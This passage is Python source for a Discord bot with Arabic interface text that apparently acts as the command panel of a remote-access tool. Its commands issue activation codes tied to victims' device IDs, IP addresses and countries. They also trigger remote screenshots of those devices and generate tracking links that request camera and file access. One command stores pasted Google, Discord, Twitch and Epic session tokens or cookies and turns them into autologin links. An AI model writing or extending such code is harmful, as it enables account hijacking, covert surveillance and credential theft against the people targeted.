        await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل:**", view=DevicesSubMenuView(devs_list), ephemeral=True)

@client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
@app_commands.checks.cooldown(1, 4)
async def generate(interaction: discord.Interaction, count: int = 1):
    if not 1 <= count <= 20: return await interaction.response.send_message("❌ من 1 إلى 20 فقط.", ephemeral=True)
    codes = [generate_random_code() for _ in range(count)]
    await interaction.response.send_message(f"⚠️ **حفظ الأكواد؟**\n" + "\n".join([f"`{c}`" for c in codes]), view=ConfirmSaveView(codes, count), ephemeral=True)

@client.tree.command(name="loginbytoken", description="توليد رابط دخول سريع وعرض التوكن للنسخ المباشر")
@app_commands.checks.cooldown(1, 3)
@app_commands.describe(platform="اختر المنصة", token_or_cookie="ضع التوكن أو الكوكيز هنا")
@app_commands.choices(platform=[
    app_commands.Choice(name="Epic Games", value="epic"),
    app_commands.Choice(name="Gmail / Google", value="gmail"),
    app_commands.Choice(name="Twitch", value="twitch"),
    app_commands.Choice(name="YouTube", value="youtube"),
    app_commands.Choice(name="Discord", value="discord"),
    app_commands.Choice(name="Other Web", value="other")
])
async def loginbytoken_command(interaction: discord.Interaction, platform: str, token_or_cookie: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    clean_token = token_or_cookie.strip()
    encoded_token = requests.utils.quote(clean_token, safe='')
    web_link = f"{HOST_URL}autologin?platform={platform}&token={encoded_token}"
    
    db, sha, url, headers = await asyncio.to_thread(fetch_db)
    if db:
        if "saved_tokens" not in db: db["saved_tokens"] = []
        db["saved_tokens"].append({"platform": platform, "token": clean_token, "link": web_link, "time": int(time.time())})
        save_db(db, sha, url, headers, f"Save token for {platform}")

    response_text = (
        f"🎮 **تم إنشاء جلسة {platform.upper()} بنجاح!**\n\n"
        f"🌐 **رابط الدخول المباشر:**\n{web_link}\n\n"
        f"📌 **التوكن بالكامل (للنسخ المباشر):**\n"
        f"```json\n{clean_token}\n```"
    )
    await interaction.followup.send(content=response_text, ephemeral=True)

@client.tree.command(name="link", description="توليد رابط تتبع مع خيارات الكاميرا والوصول للملفات")
@app_commands.describe(redirect_to="رابط الوجهة النهائية", capture_cam="طلب إذن الكاميرا؟", file_system="تفعيل الوصول للملفات")
async def generate_track_link(interaction: discord.Interaction, redirect_to: str = "https://www.google.com", capture_cam: str = "false", file_system: str = "false"):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    track_url = f"{HOST_URL}track?to={requests.utils.quote(redirect_to, safe='')}&cam={capture_cam}&fs={file_system}"
    embed = discord.Embed(title="🔗 رابط التتبع المطور جاهز", description=f"`{track_url}`", color=0xFF5733)
    await interaction.followup.send(embed=embed, ephemeral=True)

@client.tree.command(name="unused", description="عرض الأكواد غير المستخدمة مع خيارات الحذف")
async def unused_command(interaction: discord.Interaction):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = await asyncio.to_thread(fetch_db)
    if not db: 
        await interaction.followup.send("❌ خطأ في الاتصال بقاعدة البيانات.", ephemeral=True)
        return
    unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
    if not unused_list:
        await interaction.followup.send("🟢 لا توجد أكواد غير مستخدمة.", ephemeral=True)
        return
    view = UnusedManagementView(unused_list)
    await interaction.followup.send(f"🟢 **الأكواد المتاحة (اختر للحذف):**\n📊 العدد: `{len(unused_list)}`", view=view, ephemeral=True)

@client.tree.command(name="clearused", description="حذف جميع الأكواد المستخدمة دفعة واحدة")
async def clear_used_codes(interaction: discord.Interaction):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = await asyncio.to_thread(fetch_db)
    if not db or "codes" not in db: return
    old_count = len(db["codes"])
    db["codes"] = {c: info for c, info in db["codes"].items() if not info.get("used", False)}
    removed = old_count - len(db["codes"])
    if save_db(db, sha, url, headers, f"Cleared {removed} used codes"):
        await interaction.followup.send(f"🧹 تم حذف `{removed}` كود مستخدم!", ephemeral=True)

@client.tree.command(name="check", description="التحقق من حالة كود معين ومعرفة تفاصيله")
@app_commands.describe(code="الكود المراد فحصه")
async def check_code(interaction: discord.Interaction, code: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = await asyncio.to_thread(fetch_db)
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    info = db["codes"][code]
    status = "مستخدم 🔴" if info.get("used") else "متاح 🟢"
    await interaction.followup.send(f"🔍 **الكود `{code}`:**\n📌 الحالة: {status}\n🌐 IP: `{info.get('ip') or 'غير متصل'}`\n🔌 Port: `{info.get('port') or '7680'}`\n🌍 الدولة: `{info.get('country') or 'غير معروفة'}`\n🔒 HWID: `{info.get('device') or 'لا يوجد'}`", ephemeral=True)

@client.tree.command(name="delete", description="حذف كود نهائياً")
@app_commands.describe(code="الكود المراد حذفه")
async def delete_code(interaction: discord.Interaction, code: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = await asyncio.to_thread(fetch_db)
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    del db["codes"][code]
    if save_db(db, sha, url, headers, f"Delete code: {code}"):
        await interaction.followup.send(f"🗑️ تم حذف الكود `{code}` نهائياً!", ephemeral=True)

@client.tree.command(name="resetdevice", description="تصفير ارتباط الكود وإرجاعه متاحاً")
@app_commands.describe(code="الكود المراد تصفيره")
async def reset_device(interaction: discord.Interaction, code: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = await asyncio.to_thread(fetch_db)
    code = code.upper()
    if not db or code not in db.get("codes", {}):
        await interaction.followup.send(f"❌ الكود غير موجود.", ephemeral=True)
        return
    db["codes"][code]["used"] = False
    db["codes"][code]["device"] = None
    db["codes"][code]["ip"] = None
    db["codes"][code]["port"] = None
    db["codes"][code]["country"] = None
    if save_db(db, sha, url, headers, f"Reset code: {code}"):
        await interaction.followup.send(f"🔄 تم تصفير الكود `{code}` وأصبح متاحاً!", ephemeral=True)

@client.tree.command(name="screenshot", description="التقاط لقطة شاشة لجهاز عميل معين")
@app_commands.describe(target="اسم الجهاز أو كود التفعيل المستهدف")
async def screenshot_command(interaction: discord.Interaction, target: str):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, sha, url, headers = await asyncio.to_thread(fetch_db)
    if not db: return
    target_upper = target.strip().upper()
    if target_upper not in db.get("codes", {}):
        await interaction.followup.send(f"❌ لم يتم العثور على الكود: `{target}`", ephemeral=True)
        return
    if "remote_screenshots" not in db: db["remote_screenshots"] = {}
    db["remote_screenshots"][target_upper] = {"id": str(time.time())}
    if save_db(db, sha, url, headers, f"Request screenshot for {target_upper}"):
        await interaction.followup.send(f"📸 **تم إرسال أمر التقاط الشاشة بنجاح!**", ephemeral=True)

@client.tree.command(name="clear", description="حذف رسائل البوت وتنظيف الشاشة")
@app_commands.describe(amount="عدد الرسائل المراد مسحها")
async def clear_messages(interaction: discord.Interaction, amount: int = 10):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🧹 تم تنظيف وحذف `{len(deleted)}` رسالة!", ephemeral=True)
    await asyncio.sleep(3)
    try: await interaction.delete_original_response()
    except Exception: pass

@client.tree.command(name="sync", description="مزامنة الأوامر")
async def sync_commands(interaction: discord.Interaction):
    await client.tree.sync()
    if not interaction.response.is_done():
        await interaction.response.send_message("✅ تم مزامنة الأوامر بنجاح!", ephemeral=True)

@client.tree.command(name="statsgui", description="لوحة معلومات وإحصائيات تفاعلية")
async def stats_gui_command(interaction: discord.Interaction):
    if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
    db, _, _, _ = await asyncio.to_thread(fetch_db)
    if not db: return
    codes = db.get("codes", {})
    total = len(codes)
    used = sum(1 for c in codes.values() if c.get("used"))
    available = total - used
    blacklisted = len(db.get("blacklisted_codes", []))
    embed = discord.Embed(title="📊 لوحة التحكم والإحصائيات الشاملة", color=0xA871FF)
    embed.add_field(name="📌 الإجمالي", value=f"`{total}`", inline=True)
    embed.add_field(name="🟢 المتاحة", value=f"`{available}`", inline=True)
    embed.add_field(name="🔴 المستخدمة", value=f"`{used}`", inline=True)
    embed.add_field(name="🚫 المحظورة", value=f"`{blacklisted}`", inline=True)
    await interaction.followup.send(embed=embed, view=MainDashboardView(), ephemeral=True)

if TOKEN:
    client.run(TOKEN)
